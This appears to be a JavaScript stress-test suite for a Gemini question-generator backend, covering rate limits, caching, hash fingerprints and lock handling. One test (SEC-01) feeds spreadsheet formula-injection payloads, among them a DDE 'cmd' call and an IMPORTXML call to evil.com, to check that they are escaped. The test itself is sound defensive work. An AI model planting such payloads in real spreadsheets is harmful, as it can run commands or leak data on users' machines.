/**
 * tests/test_challenger_m2_burst.js
 *
 * ADVERSARIAL STRESS TEST HARNESS — MILESTONE 2
 * Rate Limit, Burst Defense, Rolling Window Boundary, Deduplication & Fingerprint Integrity
 *
 * Verifies:
 * 1. Sliding 60s window: 15 calls allowed, 16th rejected with 429 and retryAfterSeconds <= 60.
 * 2. Rolling window across boundaries (does NOT reset prematurely like fixed-minute windows).
 * 3. Deduplication cache hit returns cached: true and 0 token burn across all metrics.
 * 4. Fingerprint distinctness across all Bloom levels and Difficulty tiers (zero collisions).
 * 5. Daily quota (1,500 RPD) threshold enforcement and LockService mutex contention.
 * 6. Rate-limited execution telemetry and formula injection defenses in GeminiTokenLogs.
 */

const assert = require('assert');
const path = require('path');
const crypto = require('crypto');

// =========================================================================
// IN-MEMORY GOOGLE APPS SCRIPT SPREADSHEET & SERVICE MOCKS
// =========================================================================

class MockRange {
  constructor(sheet, startRow, startCol, numRows = 1, numCols = 1) {
    this.sheet = sheet;
    this.startRow = startRow;
    this.startCol = startCol;
    this.numRows = numRows;
    this.numCols = numCols;
  }
  getValues() {
    const res = [];
    for (let r = 0; r < this.numRows; r++) {
      const rowIdx = this.startRow - 1 + r;
      if (rowIdx < this.sheet.grid.length) {
        res.push([...this.sheet.grid[rowIdx]]);
      } else {
        res.push(new Array(this.numCols).fill(''));
      }
    }
    return res;
  }
  setValues(vals) {
    for (let r = 0; r < vals.length; r++) {
      const rowIdx = this.startRow - 1 + r;
      while (this.sheet.grid.length <= rowIdx) {
        this.sheet.grid.push([]);
      }
      for (let c = 0; c < vals[r].length; c++) {
        this.sheet.grid[rowIdx][this.startCol - 1 + c] = vals[r][c];
      }
    }
    return this;
  }
  setBackground() { return this; }
  setFontColor() { return this; }
  setFontWeight() { return this; }
  setHorizontalAlignment() { return this; }
  setBorder() { return this; }
}

class MockSheet {
  constructor(name) {
    this.name = name;
    this.grid = [];
    this.frozenRows = 0;
  }
  getName() { return this.name; }
  setName(n) { this.name = n; }
  getLastRow() { return this.grid.length; }
  getLastColumn() {
    let max = 0;
    this.grid.forEach(row => { if (row.length > max) max = row.length; });
    return max;
  }
  appendRow(rowArr) {
    this.grid.push([...rowArr]);
  }
  setFrozenRows(n) { this.frozenRows = n; }
  getRange(startRow, startCol, numRows = 1, numCols = 1) {
    return new MockRange(this, startRow, startCol, numRows, numCols);
  }
  getDataRange() {
    const numRows = Math.max(1, this.grid.length);
    let numCols = 1;
    this.grid.forEach(r => { if (r.length > numCols) numCols = r.length; });
    return new MockRange(this, 1, 1, numRows, numCols);
  }
}

class MockSpreadsheet {
  constructor() {
    this.sheets = [];
  }
  getSheetByName(name) {
    return this.sheets.find(s => s.name === name) || null;
  }
  insertSheet(name) {
    const s = new MockSheet(name);
    this.sheets.push(s);
    return s;
  }
}

const mockSpreadsheet = new MockSpreadsheet();
global.SpreadsheetApp = {
  getActiveSpreadsheet: () => mockSpreadsheet,
  BorderStyle: { SOLID: 'SOLID' }
};

let lockShouldFail = false;
global.LockService = {
  getScriptLock: () => ({
    waitLock: () => true,
    releaseLock: () => true,
    tryLock: (timeout) => !lockShouldFail
  })
};

global.Session = {
  getActiveUser: () => ({ getEmail: () => 'admin@zoptro.local' }),
  getScriptTimeZone: () => 'GMT+5:30'
};

global.HtmlService = {
  XFrameOptionsMode: { ALLOWALL: 'ALLOWALL' },
  createHtmlOutputFromFile: (name) => ({ name }),
  createHtmlOutput: (html) => ({ html })
};

global.MailApp = {
  sendEmail: () => true
};

const memoryCacheStore = {};
global.CacheService = {
  getScriptCache: () => ({
    get: (key) => memoryCacheStore[key] || null,
    put: (key, val, ttl) => { memoryCacheStore[key] = String(val); },
    remove: (key) => { delete memoryCacheStore[key]; }
  })
};

// Load Backend
const backend = require(path.join(__dirname, '../google_apps_script_backend.js'));
backend.initializeDatabase();

// Test Runner Machinery
let totalTests = 0;
let passedTests = 0;
let failedTests = 0;
const failures = [];

function runTest(testId, description, fn) {
  totalTests++;
  try {
    fn();
    passedTests++;
    console.log(`  [PASS] ${testId}: ${description}`);
  } catch (err) {
    failedTests++;
    failures.push({ testId, description, error: err });
    console.error(`  [FAIL] ${testId}: ${description}`);
    console.error(`         ${err.message}`);
  }
}

console.log('=========================================================================');
console.log('  MILESTONE 2: RATE LIMIT, BURST & ADVERSARIAL STRESS TEST HARNESS      ');
console.log('=========================================================================\n');

// =========================================================================
// SUITE 1: SLIDING 60-SECOND WINDOW RATE LIMITING (15 RPM)
// =========================================================================
console.log('>>> SUITE 1: Sliding 60-Second Window Rate Limiting (15 RPM) <<<');

const burstModel = 'gemini-burst-test-' + Date.now();

runTest('BURST-01', '15 consecutive calls within 60s are strictly permitted', () => {
  for (let i = 1; i <= 15; i++) {
    const decision = backend.checkAndIncrementRateLimit(burstModel, true);
    assert.strictEqual(decision.allowed, true, `Request #${i} should be allowed`);
    assert.strictEqual(decision.rpmLimit, 15, `RPM limit should be 15`);
    assert.strictEqual(decision.rpmCurrent, i, `rpmCurrent should be ${i}`);
    assert.strictEqual(decision.rpmRemaining, 15 - i, `rpmRemaining should be ${15 - i}`);
    assert.strictEqual(decision.retryAfterSeconds, 0, `retryAfterSeconds should be 0 for allowed request`);
  }
});

runTest('BURST-02', '16th call within rolling 60s is rejected with 429 semantics and retryAfterSeconds <= 60', () => {
  const decision = backend.checkAndIncrementRateLimit(burstModel, true);
  assert.strictEqual(decision.allowed, false, '16th request must be rejected');
  assert.strictEqual(decision.rpmCurrent, 15, 'rpmCurrent should remain capped at 15');
  assert.strictEqual(decision.rpmRemaining, 0, 'rpmRemaining must be 0');
  assert.ok(decision.retryAfterSeconds > 0, `retryAfterSeconds must be positive, got ${decision.retryAfterSeconds}`);
  assert.ok(decision.retryAfterSeconds <= 60, `retryAfterSeconds must be <= 60s, got ${decision.retryAfterSeconds}`);
  assert.ok(decision.error && decision.error.includes('RATE_LIMIT_EXCEEDED'), 'Error message must specify RATE_LIMIT_EXCEEDED');
});

runTest('BURST-03', 'Subsequent 17th through 20th burst calls remain strictly rejected without leaking quota', () => {
  for (let k = 17; k <= 20; k++) {
    const decision = backend.checkAndIncrementRateLimit(burstModel, true);
    assert.strictEqual(decision.allowed, false, `Burst attempt #${k} must be blocked`);
    assert.strictEqual(decision.rpmRemaining, 0, 'rpmRemaining must stay 0');
    assert.ok(decision.retryAfterSeconds > 0 && decision.retryAfterSeconds <= 60);
  }
});

runTest('BURST-04', 'Full generator pipeline returns HTTP 429 when rate limit is exhausted', () => {
  // Use burstModel which is currently rate-limited
  const genResult = backend.generateCurriculumQuestionsWithGemini({
    adminUserId: 'u_adm_demo',
    model: burstModel,
    grade: 'Class 4',
    subject: 'Science',
    chapter: 'Plants',
    topic: 'Leaves',
    apiKey: 'dummy-key-for-test'
  });

  assert.strictEqual(genResult.success, false, 'Generator must fail on rate limited model');
  assert.strictEqual(genResult.code, 429, 'Generator must return HTTP code 429');
  assert.ok(genResult.error && genResult.error.includes('RATE_LIMIT_EXCEEDED'), 'Must report RATE_LIMIT_EXCEEDED');
  assert.strictEqual(genResult.rateLimits.rpmRemaining, 0, 'rateLimits.rpmRemaining must be 0');
  assert.ok(genResult.rateLimits.retryAfterSeconds > 0 && genResult.rateLimits.retryAfterSeconds <= 60);
});

runTest('BURST-05', 'Rate-limited generator invocation writes RATE_LIMITED row with 0 tokens to GeminiTokenLogs', () => {
  const logs = backend.getSheetRecords('GeminiTokenLogs');
  assert.ok(Array.isArray(logs) && logs.length > 0, 'GeminiTokenLogs must have records');
  const rateLimitLog = logs.reverse().find(l => l.model === burstModel && l.status === 'RATE_LIMITED');
  assert.ok(rateLimitLog, 'Must find RATE_LIMITED log entry for burstModel');
  assert.strictEqual(Number(rateLimitLog.promptTokens), 0, 'promptTokens must be 0');
  assert.strictEqual(Number(rateLimitLog.candidateTokens), 0, 'candidateTokens must be 0');
  assert.strictEqual(Number(rateLimitLog.totalTokens), 0, 'totalTokens must be 0');
  assert.strictEqual(rateLimitLog.adminUserId, 'u_adm_demo');
});

// =========================================================================
// SUITE 2: ROLLING WINDOW ACROSS BOUNDARIES (DOES NOT RESET PREMATURELY)
// =========================================================================
console.log('\n>>> SUITE 2: Rolling Window Boundary Invariance (Anti-Tumbling Test) <<<');

runTest('ROLL-01', 'Window does NOT reset across simulated minute boundary (Sliding Window Invariance)', () => {
  const rollingModel = 'gemini-rolling-test-' + Date.now();
  const originalDateNow = Date.now;

  try {
    // Step 1: Base time at T = 1,700,000,000,000 (say 55s into a minute: 55,000ms)
    let simulatedNow = 1700000055000;
    Date.now = () => simulatedNow;

    // Fill 15 slots at T = 55s
    for (let i = 1; i <= 15; i++) {
      const d = backend.checkAndIncrementRateLimit(rollingModel, true);
      assert.strictEqual(d.allowed, true, `Call #${i} at T=55s should succeed`);
    }

    // Step 2: Advance time by 10s to T = 65,000ms.
    // In a fixed-minute tumbling window, minute changed (from :55 to :05), so it would naively reset to 0!
    // In our sliding window, only 10,000ms elapsed since the 15 calls, so all 15 calls are still in the 60s window.
    simulatedNow = 1700000065000;
    const acrossBoundary = backend.checkAndIncrementRateLimit(rollingModel, true);

    assert.strictEqual(
      acrossBoundary.allowed,
      false,
      'Crucial: Sliding window must NOT reset across a minute boundary! Only 10s elapsed, 15 calls still active.'
    );
    assert.strictEqual(acrossBoundary.rpmRemaining, 0);
    // Oldest call was at 55,000. It expires at 55,000 + 60,000 = 115,000.
    // Current time is 65,000. Remaining time is (115,000 - 65,000) / 1000 = 50 seconds.
    assert.strictEqual(acrossBoundary.retryAfterSeconds, 50, 'retryAfterSeconds must be exactly 50s');

    // Step 3: Advance time to T = 1700000114000 (59s elapsed since first burst, 1s before expiration)
    simulatedNow = 1700000114000;
    const stillBlocked = backend.checkAndIncrementRateLimit(rollingModel, true);
    assert.strictEqual(stillBlocked.allowed, false, 'Must still be blocked at 59s elapsed');
    assert.strictEqual(stillBlocked.retryAfterSeconds, 1, 'retryAfterSeconds should be 1s');

    // Step 4: Advance time to T = 1700000116000 (61s elapsed since initial burst)
    simulatedNow = 1700000116000;
    const nowAllowed = backend.checkAndIncrementRateLimit(rollingModel, true);
    assert.strictEqual(nowAllowed.allowed, true, 'Request after rolling 60s window expiration must be permitted');
    assert.strictEqual(nowAllowed.rpmCurrent, 1, 'rpmCurrent should now be 1');
    assert.strictEqual(nowAllowed.rpmRemaining, 14, 'rpmRemaining should now be 14');

  } finally {
    Date.now = originalDateNow;
  }
});

runTest('ROLL-02', 'Staggered rolling window smoothly retires expired slots individually', () => {
  const staggeredModel = 'gemini-staggered-' + Date.now();
  const originalDateNow = Date.now;

  try {
    let simTime = 1700000000000;
    Date.now = () => simTime;

    // Dispatch 5 calls at T = 0s
    for (let i = 0; i < 5; i++) {
      assert.strictEqual(backend.checkAndIncrementRateLimit(staggeredModel, true).allowed, true);
    }

    // Advance to T = 20s, dispatch 5 calls
    simTime += 20000;
    for (let i = 0; i < 5; i++) {
      assert.strictEqual(backend.checkAndIncrementRateLimit(staggeredModel, true).allowed, true);
    }

    // Advance to T = 40s, dispatch 5 calls (total 15 active)
    simTime += 20000;
    for (let i = 0; i < 5; i++) {
      assert.strictEqual(backend.checkAndIncrementRateLimit(staggeredModel, true).allowed, true);
    }

    // At T = 50s, 16th call must be blocked
    simTime += 10000;
    const blockedAt50 = backend.checkAndIncrementRateLimit(staggeredModel, true);
    assert.strictEqual(blockedAt50.allowed, false, 'Blocked at 50s because all 15 are in window');
    // Oldest 5 calls expire at T = 60s (10s remaining)
    assert.strictEqual(blockedAt50.retryAfterSeconds, 10, 'retryAfterSeconds should be 10s');

    // Advance to T = 61s: The 5 calls from T=0s have rolled out of the 60s window!
    // Exactly 5 new calls should now be permitted!
    simTime += 11000; // now at T = 61s
    for (let j = 1; j <= 5; j++) {
      const allowedSlot = backend.checkAndIncrementRateLimit(staggeredModel, true);
      assert.strictEqual(allowedSlot.allowed, true, `Slot #${j} must be allowed as old slot rolled out`);
    }

    // The 6th call at T = 61s must now be blocked (since 10 calls from T=20s and T=40s + 5 new = 15 total)
    const blockedAgain = backend.checkAndIncrementRateLimit(staggeredModel, true);
    assert.strictEqual(blockedAgain.allowed, false, 'Must be blocked again after filling the 5 freed slots');
    // Oldest calls in window are now at T = 20s, which expire at T = 80s (80 - 61 = 19s)
    assert.strictEqual(blockedAgain.retryAfterSeconds, 19, 'retryAfterSeconds must be 19s');

  } finally {
    Date.now = originalDateNow;
  }
});

// =========================================================================
// SUITE 3: DEDUPLICATION CACHE HIT & ZERO TOKEN BURN
// =========================================================================
console.log('\n>>> SUITE 3: Deduplication Caching & Zero-Token Burn Verification <<<');

runTest('CACHE-01', 'Cached Gemini response returns cached: true and exactly 0 token consumption', () => {
  const cacheTestPayload = {
    adminUserId: 'u_adm_demo',
    model: 'gemini-1.5-flash',
    grade: 'Class 5',
    subject: 'Environmental Studies',
    chapter: 'Super Senses',
    topic: 'Animal Senses',
    questionType: 'MCQ',
    quantity: 5,
    difficulty: 'Easy',
    bloomLevel: 'Understanding'
  };

  const fp = backend.computeGeminiCacheFingerprint(cacheTestPayload);
  assert.ok(fp && fp.length === 64, 'Fingerprint must be 64-char hex string');

  // Seed cache directly
  const cachedItems = [
    {
      id: 'mock_curr_1',
      title: 'Super Senses - Animal Senses (Q1)',
      questionText: 'Which animal can see six times better at night than most of us?',
      options: ['Tiger', 'Dog', 'Elephant', 'Horse'],
      correctOptionIndex: 0,
      hint: 'It is a big cat found in Indian forests.',
      explanation: 'A tiger can see six times better at night than humans.',
      bloomLevel: 'Understanding',
      difficulty: 'Easy'
    }
  ];

  backend.setCachedGeminiResponse(fp, {
    items: cachedItems,
    model: 'gemini-1.5-flash',
    promptTokens: 450,
    candidateTokens: 250,
    totalTokens: 700
  }, 3600);

  // Invoke generator
  const genResponse = backend.generateCurriculumQuestionsWithGemini(cacheTestPayload);

  assert.strictEqual(genResponse.success, true, 'Generator should succeed via cache hit');
  assert.strictEqual(genResponse.cached, true, 'Response must have cached: true');
  assert.strictEqual(genResponse.items.length, 1, 'Should return cached items');
  assert.strictEqual(genResponse.items[0].id, 'mock_curr_1');

  // STRICT ZERO TOKEN VERIFICATION
  assert.strictEqual(genResponse.tokenUsage.promptTokens, 0, 'promptTokens must be strictly 0 on cache hit');
  assert.strictEqual(genResponse.tokenUsage.candidateTokens, 0, 'candidateTokens must be strictly 0 on cache hit');
  assert.strictEqual(genResponse.tokenUsage.totalTokens, 0, 'totalTokens must be strictly 0 on cache hit');
  assert.strictEqual(genResponse.tokenUsage.estimatedCostUsd, 0.0000, 'estimatedCostUsd must be strictly 0');
});

runTest('CACHE-02', 'Cache hit does NOT consume rate limit slots', () => {
  const probeModel = 'cache-rpm-probe-' + Date.now();
  const probePayload = {
    adminUserId: 'u_adm_demo',
    model: probeModel,
    grade: 'Class 5',
    subject: 'Environmental Studies',
    chapter: 'Super Senses',
    topic: 'Animal Senses 2',
    questionType: 'MCQ',
    quantity: 5,
    difficulty: 'Easy',
    bloomLevel: 'Understanding'
  };

  const fpProbe = backend.computeGeminiCacheFingerprint(probePayload);
  backend.setCachedGeminiResponse(fpProbe, {
    items: [{ id: 'probe_1', title: 'Probe Item' }],
    model: probeModel
  }, 3600);

  // Check rate limit state before cache hit
  const statusBefore = backend.checkAndIncrementRateLimit(probeModel, false);
  const rpmBefore = statusBefore.rpmCurrent;

  // Execute 5 cache hits in a row
  for (let c = 0; c < 5; c++) {
    const res = backend.generateCurriculumQuestionsWithGemini(probePayload);
    assert.strictEqual(res.cached, true);
    assert.strictEqual(res.tokenUsage.totalTokens, 0);
  }

  // Check rate limit state after cache hits
  const statusAfter = backend.checkAndIncrementRateLimit(probeModel, false);
  assert.strictEqual(
    statusAfter.rpmCurrent,
    rpmBefore,
    'Cache hits must not increment the rate limiter counter!'
  );
});

runTest('CACHE-03', 'Table 15 GeminiTokenLogs registers cache hit with cachedFlag: true and 0 totalTokens', () => {
  const logs = backend.getSheetRecords('GeminiTokenLogs');
  const cacheHitLog = logs.reverse().find(l => l.topic === 'Animal Senses' && l.cachedFlag === true);
  assert.ok(cacheHitLog, 'Must find cache hit record in GeminiTokenLogs');
  assert.strictEqual(Number(cacheHitLog.promptTokens), 0, 'promptTokens must be 0 in log');
  assert.strictEqual(Number(cacheHitLog.candidateTokens), 0, 'candidateTokens must be 0 in log');
  assert.strictEqual(Number(cacheHitLog.totalTokens), 0, 'totalTokens must be 0 in log');
  assert.strictEqual(cacheHitLog.status, 'SUCCESS');
});

runTest('CACHE-04', 'forceRefresh: true successfully bypasses cache even when cached entry exists', () => {
  const freshPayload = {
    adminUserId: 'u_adm_demo',
    model: 'gemini-fresh-test-' + Date.now(),
    grade: 'Class 5',
    subject: 'Science',
    chapter: 'Plants',
    topic: 'Seed Dispersal',
    questionType: 'MCQ',
    quantity: 5,
    difficulty: 'Medium',
    bloomLevel: 'Applying',
    forceRefresh: true,
    apiKey: 'dummy-api-key'
  };

  const fp = backend.computeGeminiCacheFingerprint(freshPayload);
  backend.setCachedGeminiResponse(fp, {
    items: [{ id: 'old_cached_item', title: 'Old Seed Dispersal' }]
  }, 3600);

  // If forceRefresh bypasses cache, it will attempt executeGeminiApiCall.
  // Since UrlFetchApp is not connected to real internet in Node test runner,
  // executeGeminiApiCall will fail or return network/mock error, NOT return the cached entry!
  const res = backend.generateCurriculumQuestionsWithGemini(freshPayload);
  assert.notStrictEqual(
    res.items && res.items[0] && res.items[0].id,
    'old_cached_item',
    'forceRefresh: true must bypass cached response'
  );
});

// =========================================================================
// SUITE 4: CANONICAL FINGERPRINT DISTINCTNESS & ZERO COLLISION AUDIT
// =========================================================================
console.log('\n>>> SUITE 4: Canonical SHA-256 Fingerprint Distinctness & Collision Audit <<<');

const baseFPConfig = {
  model: 'gemini-1.5-flash',
  gradeClass: 'Class 7',
  subject: 'Mathematics',
  chapter: 'Integers',
  topic: 'Multiplication of Negative Numbers',
  questionType: 'MCQ',
  quantity: 5,
  difficulty: 'Medium',
  bloomLevel: 'Applying'
};

runTest('FP-01', 'Changing bloomLevel produces mutually distinct fingerprints across all 6 cognitive domains', () => {
  const bloomLevels = [
    'Remembering',
    'Understanding',
    'Applying',
    'Analyzing',
    'Evaluating',
    'Creating'
  ];

  const fingerprints = new Set();
  bloomLevels.forEach(level => {
    const fp = backend.computeGeminiCacheFingerprint({
      ...baseFPConfig,
      bloomLevel: level
    });
    assert.strictEqual(fp.length, 64, `Fingerprint for bloomLevel ${level} must be 64-character SHA-256`);
    assert.ok(!fingerprints.has(fp), `Collision detected on bloomLevel: ${level}`);
    fingerprints.add(fp);
  });

  assert.strictEqual(fingerprints.size, 6, 'All 6 Bloom levels must yield completely distinct fingerprints');
});

runTest('FP-02', 'Changing difficulty produces mutually distinct fingerprints across Easy, Medium, Hard', () => {
  const difficulties = ['Easy', 'Medium', 'Hard'];
  const fingerprints = new Set();

  difficulties.forEach(diff => {
    const fp = backend.computeGeminiCacheFingerprint({
      ...baseFPConfig,
      difficulty: diff
    });
    assert.strictEqual(fp.length, 64);
    assert.ok(!fingerprints.has(fp), `Collision detected on difficulty: ${diff}`);
    fingerprints.add(fp);
  });

  assert.strictEqual(fingerprints.size, 3, 'All 3 difficulty tiers must yield distinct fingerprints');
});

runTest('FP-03', 'Full 6x3 Bloom-Difficulty combinatorial matrix (18 configurations) exhibits 0 hash collisions', () => {
  const bloomLevels = ['Remembering', 'Understanding', 'Applying', 'Analyzing', 'Evaluating', 'Creating'];
  const difficulties = ['Easy', 'Medium', 'Hard'];

  const hashRegistry = new Map();
  let totalEvaluated = 0;

  bloomLevels.forEach(b => {
    difficulties.forEach(d => {
      totalEvaluated++;
      const config = { ...baseFPConfig, bloomLevel: b, difficulty: d };
      const hash = backend.computeGeminiCacheFingerprint(config);

      assert.strictEqual(
        hashRegistry.has(hash),
        false,
        `FATAL HASH COLLISION: Config [Bloom=${b}, Diff=${d}] collided with [${hashRegistry.get(hash)}] on hash ${hash}`
      );
      hashRegistry.set(hash, `Bloom=${b}, Diff=${d}`);
    });
  });

  assert.strictEqual(totalEvaluated, 18);
  assert.strictEqual(hashRegistry.size, 18, 'All 18 combinations in Bloom-Difficulty space must have unique fingerprints');
});

runTest('FP-04', 'Model selection (gemini-1.5-flash vs gemini-2.0-flash) yields distinct fingerprints', () => {
  const fp15 = backend.computeGeminiCacheFingerprint({ ...baseFPConfig, model: 'gemini-1.5-flash' });
  const fp20 = backend.computeGeminiCacheFingerprint({ ...baseFPConfig, model: 'gemini-2.0-flash' });
  const fpPro = backend.computeGeminiCacheFingerprint({ ...baseFPConfig, model: 'gemini-1.5-pro' });

  assert.notStrictEqual(fp15, fp20, '1.5 Flash and 2.0 Flash must have distinct fingerprints');
  assert.notStrictEqual(fp15, fpPro, '1.5 Flash and 1.5 Pro must have distinct fingerprints');
  assert.notStrictEqual(fp20, fpPro, '2.0 Flash and 1.5 Pro must have distinct fingerprints');
});

runTest('FP-05', 'Grade representation normalization (grade: "Class 7" vs grade: "7") yields identical canonical fingerprint', () => {
  const fpAlpha = backend.computeGeminiCacheFingerprint({ ...baseFPConfig, gradeClass: 'Class 7' });
  const fpNumeric = backend.computeGeminiCacheFingerprint({ ...baseFPConfig, grade: '7' });
  const fpLower = backend.computeGeminiCacheFingerprint({ ...baseFPConfig, gradeClass: 'class 7' });

  assert.strictEqual(fpAlpha, fpNumeric, 'Grade "Class 7" and "7" must normalize to the exact same fingerprint');
  assert.strictEqual(fpAlpha, fpLower, 'Grade "Class 7" and "class 7" must normalize to the exact same fingerprint');
});

runTest('FP-06', 'Adversarial delimiter injection test: double colon "::" in topic does not collide with adjacent parameter values', () => {
  // If someone passes topic: "Test::MCQ::5", does it collide with normal topic "Test" with questionType "MCQ"?
  const fpInjected = backend.computeGeminiCacheFingerprint({
    ...baseFPConfig,
    topic: 'Test::MCQ::5',
    questionType: 'DESCRIPTIVE',
    quantity: 10
  });

  const fpLegit = backend.computeGeminiCacheFingerprint({
    ...baseFPConfig,
    topic: 'Test',
    questionType: 'MCQ',
    quantity: 5
  });

  assert.notStrictEqual(
    fpInjected,
    fpLegit,
    'Injected double colons must not cause fingerprint forgery or collision'
  );
});

// =========================================================================
// SUITE 5: DAILY QUOTA (1,500 RPD) & LOCK CONCURRENCY DEFENSE
// =========================================================================
console.log('\n>>> SUITE 5: Daily Quota (1,500 RPD) & Lock Concurrency Defenses <<<');

runTest('RPD-01', 'Reaching 1,500 RPD ceiling enforces DAILY_QUOTA_EXCEEDED with retryAfterSeconds to midnight UTC', () => {
  const rpdModel = 'gemini-rpd-cap-' + Date.now();
  const now = Date.now();
  const todayUtc = new Date(now).toISOString().substring(0, 10);
  const modelSafeKey = rpdModel.replace(/[^a-zA-Z0-9_.-]/g, '_');
  const rpdKey = 'gemini_rpd_' + modelSafeKey + '_' + todayUtc;

  // Pre-seed cache to 1499
  const cache = (typeof CacheService !== 'undefined' && CacheService.getScriptCache)
    ? CacheService.getScriptCache()
    : null;
  if (cache) {
    cache.put(rpdKey, '1499', 21600);
  }

  // 1500th request should be allowed (consuming slot 1500)
  const d1500 = backend.checkAndIncrementRateLimit(rpdModel, true);
  assert.strictEqual(d1500.allowed, true, '1500th request of the day must be allowed');
  assert.strictEqual(d1500.rpdCurrent, 1500, 'rpdCurrent should now be 1500');
  assert.strictEqual(d1500.dailyRemaining, 0, 'dailyRemaining should now be 0');

  // 1501st request should be rejected with DAILY_QUOTA_EXCEEDED
  const d1501 = backend.checkAndIncrementRateLimit(rpdModel, true);
  assert.strictEqual(d1501.allowed, false, '1501st request must be rejected');
  assert.strictEqual(d1501.dailyRemaining, 0);
  assert.ok(d1501.retryAfterSeconds > 0, `retryAfterSeconds should be positive, got ${d1501.retryAfterSeconds}`);
  assert.ok(d1501.retryAfterSeconds <= 86400, `retryAfterSeconds should be <= 86400s`);
  assert.ok(d1501.error && d1501.error.includes('DAILY_QUOTA_EXCEEDED'), 'Error message must specify DAILY_QUOTA_EXCEEDED');
});

runTest('BURST-06', 'High-volume burst (50 rapid requests): exactly 15 allowed, exactly 35 rejected', () => {
  const massiveBurstModel = 'gemini-massive-burst-' + Date.now();
  let allowedCount = 0;
  let rejectedCount = 0;

  for (let req = 1; req <= 50; req++) {
    const dec = backend.checkAndIncrementRateLimit(massiveBurstModel, true);
    if (dec.allowed) {
      allowedCount++;
    } else {
      rejectedCount++;
      assert.strictEqual(dec.rpmRemaining, 0);
      assert.ok(dec.retryAfterSeconds > 0 && dec.retryAfterSeconds <= 60);
    }
  }

  assert.strictEqual(allowedCount, 15, `Exactly 15 of 50 burst requests must be permitted; got ${allowedCount}`);
  assert.strictEqual(rejectedCount, 35, `Exactly 35 of 50 burst requests must be blocked; got ${rejectedCount}`);
});

runTest('FP-07', 'Default and empty payload resilience in computeGeminiCacheFingerprint', () => {
  const fpNull = backend.computeGeminiCacheFingerprint(null);
  const fpEmpty = backend.computeGeminiCacheFingerprint({});
  const fpUndef = backend.computeGeminiCacheFingerprint(undefined);

  assert.strictEqual(fpNull.length, 64);
  assert.strictEqual(fpEmpty.length, 64);
  assert.strictEqual(fpNull, fpEmpty, 'null and empty object must produce identical default fingerprint');
  assert.strictEqual(fpNull, fpUndef, 'null and undefined must produce identical default fingerprint');
});

runTest('LOCK-01', 'Lock contention failure in checkAndIncrementRateLimit returns safe fail-closed decision', () => {
  lockShouldFail = true;
  try {
    const decision = backend.checkAndIncrementRateLimit('test-lock-model', true);
    assert.strictEqual(decision.allowed, false, 'Must fail-closed when lock acquisition fails');
    assert.strictEqual(decision.retryAfterSeconds, 2, 'Must suggest short retryAfterSeconds (2s)');
    assert.ok(decision.error && decision.error.includes('RATE_LIMIT_LOCK_TIMEOUT'), 'Must report lock timeout error');
  } finally {
    lockShouldFail = false;
  }
});

runTest('TELEMETRY-01', 'getGeminiQuotaStatus provides non-mutating inspection without burning tokens or slots', () => {
  const telemetryModel = 'gemini-telemetry-probe-' + Date.now();

  // Baseline inspection
  const q1 = backend.getGeminiQuotaStatus({
    adminUserId: 'u_adm_demo',
    model: telemetryModel
  });

  assert.strictEqual(q1.success, true);
  assert.strictEqual(q1.rpmLimit, 15);
  assert.strictEqual(q1.rpdLimit, 1500);
  assert.strictEqual(q1.rpmCurrent, 0);
  assert.strictEqual(q1.rpmRemaining, 15);

  // Inspect again 10 times
  for (let t = 0; t < 10; t++) {
    const qIter = backend.getGeminiQuotaStatus({
      adminUserId: 'u_adm_demo',
      model: telemetryModel
    });
    assert.strictEqual(qIter.rpmCurrent, 0, 'Telemetry queries must NOT increment rpmCurrent');
    assert.strictEqual(qIter.rpmRemaining, 15, 'rpmRemaining must remain 15');
  }
});

runTest('SEC-01', 'Formula injection characters (=, +, -, @) are sanitized before logging to GeminiTokenLogs', () => {
  const evilPayload = {
    adminUserId: '=CMD|"/C calc"!A0',
    model: '+cmd|calc',
    grade: '-Class 5',
    subject: '@SUM(A1:A10)',
    topic: '=IMPORTXML("http://evil.com","//")',
    questionType: 'MCQ',
    quantity: 5,
    promptTokens: 100,
    candidateTokens: 100,
    totalTokens: 200,
    status: '=MALICIOUS()'
  };

  const logged = backend.recordGeminiTokenUsageLog(evilPayload);

  assert.ok(logged.adminUserId.startsWith("'"), 'adminUserId must be prefixed with single quote');
  assert.ok(logged.model.startsWith("'"), 'model must be prefixed with single quote');
  assert.ok(logged.grade.startsWith("'"), 'grade must be prefixed with single quote');
  assert.ok(logged.subject.startsWith("'"), 'subject must be prefixed with single quote');
  assert.ok(logged.topic.startsWith("'"), 'topic must be prefixed with single quote');
  assert.ok(logged.status.startsWith("'"), 'status must be prefixed with single quote');
});

// =========================================================================
// SUMMARY & VERDICT
// =========================================================================
console.log('\n=========================================================================');
console.log(`TOTAL ADVERSARIAL TESTS: ${totalTests}`);
console.log(`PASSED: ${passedTests}`);
console.log(`FAILED: ${failedTests}`);
console.log(`SUCCESS RATE: ${((passedTests / totalTests) * 100).toFixed(2)}%`);
console.log('=========================================================================');

if (failedTests > 0) {
  console.error('\nFAILURE BREAKDOWN:');
  failures.forEach(f => {
    console.error(`- ${f.testId} (${f.description}): ${f.error.message}`);
  });
  process.exit(1);
} else {
  console.log('\nALL ADVERSARIAL STRESS CHALLENGES PASSED EMPIRICALLY (100% SUCCESS)');
}
